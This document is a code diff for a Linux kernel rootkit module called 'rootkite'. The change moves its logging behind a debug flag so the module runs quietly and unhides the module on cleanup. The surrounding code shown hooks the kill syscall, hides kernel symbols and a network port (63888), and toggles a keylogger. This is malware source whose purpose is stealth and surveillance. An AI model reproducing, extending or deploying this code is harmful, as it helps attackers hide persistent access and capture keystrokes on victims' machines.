@@ -16,11 +16,6 @@ MODULE_DESCRIPTION("rootkite");
 MODULE_AUTHOR("NondairyDig");
 MODULE_VERSION("1.0");
 
-/*
-!!! change to debugger
-!!! consider workqueues and mutex usage
-*/
-
 
 static void cleanup(void){
     fh_remove_hooks(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE); //cleanup the hooks and revert them
@@ -35,17 +30,24 @@ static void cleanup(void){
     if(KEYLOG_ACTIVE){
         switch_key_logging();
     }
+    if(hidden){
+        show_mod();
+    }
 }
 
 
 static int __init mod_init(void){
-    pr_info("Activated rootkite, Initializing & Hooking Kill\n");
+#ifdef KITE_DEBUG
+	pr_info("Activated rootkite, Initializing & Hooking Kill\n");
     #ifdef PTREGS_SYSCALL_STUB
-        pr_info("Running in 64bit mode");
+	pr_info("Running in 64bit mode");
     #endif
+#endif
     misc_register(&controller); // register the device for interaction within filesystem
     if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "__x64_sys_kill") == 1){ //hook the kill function for interaction with the lkm
-        pr_err("error hooking syscall %d\n", __NR_kill);
+#ifdef KITE_DEBUG
+	    pr_err("error hooking syscall %d\n", __NR_kill);
+#endif
     }
     hide_ksyms();
     insert_node(&ports_to_hide, "63888");
@@ -54,8 +56,10 @@ static int __init mod_init(void){
 
 
 static void __exit mod_exit(void){
+#ifdef KITE_DEBUG
+	pr_info("Cleaning Up & Exiting Rootkite\n");
+#endif
     cleanup();
-    pr_info("rootkite: exit\n");
 }
 
 
